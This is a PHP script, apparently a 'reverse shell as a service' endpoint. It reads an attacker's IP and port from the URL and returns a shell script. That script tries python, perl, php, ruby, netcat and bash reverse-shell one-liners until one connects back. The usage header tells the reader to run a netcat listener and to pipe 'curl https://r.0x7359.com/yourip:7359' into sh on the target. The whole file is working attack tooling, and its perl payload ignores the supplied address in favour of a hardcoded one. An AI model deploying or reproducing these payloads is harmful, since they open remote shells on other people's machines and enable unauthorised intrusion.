<?php
echo "# Reverse Shell as a Service
# https://github.com/Nickguitar/reverse-shell
#
# 1. On your machine:
#      nc -l 7359
#
# 2. On the target machine:
#      curl https://r.0x7359.com/yourip:7359 | sh\n\n";

$s = isset($_GET['x']) ? explode(":",$_GET['x']) : "";
if(!isset($s[1])) die();

$payloads = [
	"python3" => "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$s[0]\",$s[1]));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'",
	"python" => "python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((\"$s[0]\",$s[1]));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
	"perl" => "perl -e 'use Socket;\$i=\"127.0.0.1\";\$p=7359;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
	"php" => "php -r '\$k=fsockopen(\"$s[0]\",$s[1]);exec(\"/bin/sh <&3 >&3 2>&3\");'",
	"ruby" => "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"$s[0]\",$s[1]))'",
	"nc" => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $s[0] $s[1] >/tmp/f",
	"bash" => "/bin/bash -i >& /dev/tcp/$s[0]/$s[1] 0>&1",
	"sh" => "/bin/sh -i >& /dev/tcp/$s[0]/$s[1] 0>&1"];

foreach($payloads as $exe => $cmd)
	echo "if command -v $exe > /dev/null 2>&1; then\n\t$cmd\n\texit;\nfi\n\n";
